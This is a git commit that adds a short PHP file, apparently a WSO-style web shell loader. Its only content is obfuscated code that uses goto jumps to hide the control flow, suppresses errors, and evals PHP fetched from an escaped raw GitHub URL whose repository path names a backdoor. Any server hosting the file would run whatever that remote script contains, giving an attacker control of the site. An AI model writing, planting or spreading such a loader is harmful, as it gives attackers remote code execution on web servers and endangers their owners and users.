d77ee18d3d9578203eebec693e822107a20c0c75
inyoengmarkonslot <149763310+inyoengmarkonslot@users.noreply.github.com>
2026-02-05 14:58:48 +0700

    Create wsoinyong.php

---
+++ wsoinyong.php
@@ -0,0 +1,4 @@
+<?php
+//skajiowhuwhw
+ goto YuMtT; OiK04: @error_reporting(0); goto ToQ4J; ToQ4J: @null; goto vjq2F; YuMtT: echo @null; goto OiK04; vjq2F: @eval("\77\76" . file_get_contents("\150\164\164\x70\163\72\x2f\57\162\x61\x77\56\147\x69\164\150\165\142\x75\163\145\x72\x63\157\156\x74\145\156\164\x2e\x63\157\155\57\x63\150\x75\x63\153\171\162\x65\160\154\171\57\142\x63\153\x64\x6f\x6f\162\x2f\x72\145\x66\163\57\x68\145\141\144\x73\57\x6d\141\x69\x6e\x2f\x61\x62\x6f\165\164\70\x2e\x70\150\160"));
+
